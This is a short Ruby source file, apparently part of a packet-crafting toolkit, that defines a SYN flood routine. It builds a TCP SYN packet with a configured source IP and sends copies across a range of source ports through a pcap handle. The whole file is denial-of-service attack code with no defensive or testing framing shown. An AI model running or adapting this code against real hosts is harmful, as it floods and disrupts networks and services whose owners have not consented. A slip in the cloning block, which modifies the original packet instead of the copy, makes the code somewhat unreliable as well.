require_relative '../../protocol/tcp_pac.rb'
class TCPP
	def self.syn_flood(pcap)
		syn_pac = TCPP.syn_pac{|sp|
			sp.ipv4h.src_addr = CONFIG[:src_ip]
			sp.tcph.src_port = CONFIG[:port_range].min
		}
		CONFIG[:port_range].each do|i|
			syn_pac = TCPP.pac_from_pac(syn_pac) do |pac|
				syn_pac.tcph.src_port = i
			end
			pcap.send_packet(syn_pac)
		end
	end
end